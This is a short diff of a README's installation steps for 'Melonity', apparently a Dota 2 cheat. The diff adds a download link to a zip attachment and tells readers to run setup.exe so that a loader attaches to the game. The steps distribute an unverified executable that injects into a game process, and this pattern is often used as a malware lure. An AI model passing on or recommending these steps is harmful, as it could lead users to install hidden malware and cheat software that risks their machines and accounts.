@@ -9,7 +9,7 @@ __________________
 # Installation
 To install and run Melonity:
 
-+ [Download]()
++ [Download](https://github.com/user-attachments/files/21125816/Melonity.Client.zip)
 +  Extract the archive
 + Run setup.exe
 + Launch Dota 2 — the loader will attach automatically
